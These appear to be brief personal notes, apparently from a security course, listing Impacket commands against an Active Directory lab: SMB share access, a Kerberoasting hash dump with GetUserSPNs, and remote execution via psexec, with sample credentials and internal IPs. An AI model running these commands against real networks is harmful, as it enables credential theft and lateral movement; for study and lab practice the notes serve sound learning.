example: impacket-smbclient aulas/postgrados:'mieia'@172.17.37.32 - This is to access the shared files at the AD

it can be used to get SPNs to do a kerberoasting attack
Kerberoast attack example:
impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.0.0.4 'contoso.com/diplomado:password'


impacket-psexec contoso/diplomado:password@10.0.0.21  
To access to target machine. It if had admin it can be interesting.

